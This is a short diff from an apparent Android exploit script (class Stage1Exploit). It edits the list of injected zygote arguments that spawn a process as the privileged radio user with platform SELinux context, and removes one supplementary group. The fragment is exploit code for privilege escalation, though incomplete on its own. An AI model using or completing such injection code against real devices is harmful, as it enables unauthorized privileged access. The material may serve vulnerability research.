@@ -191,7 +191,7 @@ class Stage1Exploit:
         raw_zygote_arguments = [
             "--setuid=1001",
             "--setgid=1001",
-            "--setgroups=3003,1015",
+            "--setgroups=3003",
             "--runtime-args",
             "--seinfo=platform:radio:complete",
             "--runtime-flags=1",
